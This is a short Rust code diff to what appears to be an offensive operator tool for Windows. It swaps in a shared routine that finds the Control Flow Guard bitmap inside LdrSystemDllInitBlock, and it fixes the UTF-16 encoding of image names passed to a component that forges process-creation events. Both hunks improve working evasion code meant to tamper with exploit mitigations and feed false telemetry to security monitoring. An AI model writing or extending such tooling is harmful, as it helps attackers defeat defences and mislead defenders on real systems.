@@ -386,9 +386,10 @@ fn main() {
             let block_size = unsafe { *(init_addr as *const u32) } as usize;
             eprintln!("[*] LdrSystemDllInitBlock size = 0x{block_size:x}");
 
-            let cfg_off: usize = if block_size <= 0x70 { 0x40 }
-                else if block_size <= 0xF8 { 0x60 }
-                else { 0x68 };
+            // kernel-tools-4: shared offset selection from operator-kernelsdk —
+            // the standalone cfg-write binary used a DIVERGENT mapping for the
+            // same block sizes, so at most one of the two was ever correct.
+            let cfg_off = nyx_operator_kernelsdk::cfg::cfg_bitmap_offset(block_size);
 
             let bitmap_addr = unsafe { *((init_addr + cfg_off) as *const usize) };
             let bitmap_size = unsafe { *((init_addr + cfg_off + 8) as *const usize) };
@@ -454,10 +455,18 @@ fn main() {
                 .duration_since(std::time::UNIX_EPOCH)
                 .unwrap_or_default()
                 .as_nanos() as u64;
+            // kernelsdk-2-7: the API documents the image path as UTF-16LE bytes
+            // (the forged event embeds a UNICODE_STRING); the CLI previously
+            // passed raw ASCII bytes (1 byte per char), producing a malformed
+            // image name. Encode properly.
+            let image_utf16: Vec<u8> = image_name
+                .encode_utf16()
+                .flat_map(|u| u.to_le_bytes())
+                .collect();
             let buf = deceiver.forge_process_create(
                 parent_pid,
                 child_pid,
-                image_name.as_bytes(),
+                &image_utf16,
                 timestamp,
             ).map_err(|e| {
                 eprintln!("[!] forge_process_create failed: {e}");
